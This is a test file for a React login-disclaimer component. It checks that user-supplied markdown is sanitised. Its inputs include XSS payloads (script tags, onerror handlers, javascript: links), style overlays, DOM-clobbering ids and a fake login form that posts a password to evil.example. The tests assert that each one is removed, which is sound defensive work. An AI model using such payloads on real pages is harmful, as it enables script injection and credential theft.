import { createTheme, ThemeProvider } from '@mui/material/styles';
import { render, screen } from '@testing-library/react';
import React, { type ReactNode } from 'react';
import { describe, expect, it } from 'vitest';

import LoginDisclaimer from './LoginDisclaimer';

const theme = createTheme({ cssVariables: true });

const renderWithTheme = (ui: ReactNode) => render(
    <ThemeProvider theme={theme}>{ui}</ThemeProvider>
);

describe('LoginDisclaimer', () => {
    it.each([
        [ 'undefined', undefined ],
        [ 'null', null ],
        [ 'empty', '' ]
    ])('renders nothing when the disclaimer is %s', (_, markdown) => {
        const { container } = renderWithTheme(<LoginDisclaimer markdown={markdown} />);

        expect(container).toBeEmptyDOMElement();
    });

    it('renders the markdown', () => {
        renderWithTheme(<LoginDisclaimer markdown={'# Welcome\n\nPlease **behave**'} />);

        expect(screen.getByRole('heading', { name: 'Welcome' })).toBeInTheDocument();
        expect(screen.getByText('behave').tagName).toBe('STRONG');
    });

    it('removes scripts and event handlers', () => {
        const { container } = renderWithTheme(
            <LoginDisclaimer
                markdown={'<script>window.pwned = true</script>\n\n<img src="x" onerror="window.pwned = true" alt="logo">'}
            />
        );

        expect(container.querySelector('script')).toBeNull();
        const image = screen.getByRole('img', { name: 'logo' });
        expect(image).not.toHaveAttribute('onerror');
        expect(container.innerHTML).not.toContain('pwned');
    });

    it('removes javascript links', () => {
        const { container } = renderWithTheme(
            <LoginDisclaimer markdown={'<a href="javascript:alert(1)">html</a> [markdown](javascript:alert(1))'} />
        );

        expect(screen.getByText('html')).not.toHaveAttribute('href');
        // markdown-it does not create links for javascript: urls
        expect(screen.queryByRole('link', { name: 'markdown' })).not.toBeInTheDocument();
        expect(container.querySelector('[href]')).toBeNull();
    });

    it('removes forms and inputs', () => {
        const { container } = renderWithTheme(
            <LoginDisclaimer
                markdown={'<form action="https://evil.example/steal" method="post"><input type="password" name="pw"><button type="submit">Sign in</button><textarea></textarea><select><option>a</option></select></form>'}
            />
        );

        for (const tag of [ 'form', 'input', 'button', 'textarea', 'select', 'option' ]) {
            expect(container.querySelector(tag)).toBeNull();
        }
        expect(container.innerHTML).not.toContain('evil.example');
    });

    it('removes styles', () => {
        const { container } = renderWithTheme(
            <LoginDisclaimer
                markdown={'<style>body { display: none }</style>\n\n<p style="position: fixed; inset: 0">Overlay</p>'}
            />
        );

        expect(container.querySelector('style')).toBeNull();
        expect(screen.getByText('Overlay')).not.toHaveAttribute('style');
        expect(container.innerHTML).not.toContain('display: none');
    });

    it('prefixes ids and names to prevent DOM clobbering', () => {
        const { container } = renderWithTheme(
            <LoginDisclaimer markdown={'<a id="NativeShell" name="appHost" href="/help">Help</a>'} />
        );

        const link = screen.getByRole('link', { name: 'Help' });
        expect(link).toHaveAttribute('id', 'user-content-NativeShell');
        expect(link).toHaveAttribute('name', 'user-content-appHost');
        expect(container.querySelector('#NativeShell')).toBeNull();
        expect('NativeShell' in window).toBe(false);
        expect('appHost' in window).toBe(false);
    });

    it('opens links in a new window', () => {
        renderWithTheme(<LoginDisclaimer markdown='[Terms](https://example.com/terms) <a href="/help">Help</a>' />);

        for (const name of [ 'Terms', 'Help' ]) {
            const link = screen.getByRole('link', { name });
            expect(link).toHaveAttribute('target', '_blank');
            expect(link).toHaveAttribute('rel', 'noopener noreferrer');
        }
        expect(screen.getByRole('link', { name: 'Terms' })).toHaveAttribute('href', 'https://example.com/terms');
    });
});
